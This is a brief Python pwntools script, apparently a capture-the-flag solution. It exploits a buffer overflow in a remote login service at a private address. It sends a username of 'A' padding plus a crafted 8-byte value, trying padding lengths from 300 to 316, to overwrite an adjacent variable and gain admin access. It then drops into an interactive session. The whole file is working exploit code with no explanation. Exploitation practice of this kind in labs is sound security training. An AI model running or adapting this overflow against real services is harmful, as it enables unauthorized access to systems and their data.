import pwn

# Target byte sequence for -60452921414551197
target_value = b"\x63\x79\x73\x65\x63\x3a\x29\xff" 

# Try offsets from 300 to 316 to handle compiler positioning of customer_id
for offset in range(300, 320, 4):
    try:
        io = pwn.remote('10.21.232.223', 58852)
        io.sendlineafter(b"Enter you Customer ID : ", b"1")
        
        payload = b"A" * offset + target_value
        io.sendlineafter(b"Enter your Username : ", payload)
        
        response = io.recvlines(2, timeout=1)
        response_text = b"".join(response).decode(errors='ignore')
        
        if "Admin" in response_text or "flag" in response_text:
            print(f"[+] Success at offset {offset}!")
            io.interactive()
            break
        else:
            io.close()
    except Exception as e:
        pass
